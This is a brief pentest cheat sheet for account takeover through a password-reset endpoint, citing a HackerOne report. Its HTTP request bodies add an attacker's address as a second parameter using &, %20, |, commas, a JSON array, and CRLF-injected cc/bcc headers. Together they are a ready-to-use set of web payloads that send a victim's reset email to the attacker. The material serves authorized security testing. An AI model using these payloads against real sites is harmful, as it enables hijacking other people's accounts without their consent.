**Step 1**

Click forgot password

**Step 2**

Intercept the request and see the victim’s email address.

Add attacker email as second parameter using &

```
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```

Add attacker email as second parameter using %20

```
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```

Add attacker email as second parameter using |

```
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```

Add attacker email as second parameter using cc

```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

Add attacker email as second parameter using bcc

```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```

Add attacker email as second parameter using ,

```
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```

Add attacker email as second parameter in json array

```
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

************Step 3************

Forward the request and if you receive and email to reset the victim’s password, then it’s vulnerable.

**Reference**

[https://hackerone.com/reports/1175081](https://hackerone.com/reports/1175081)
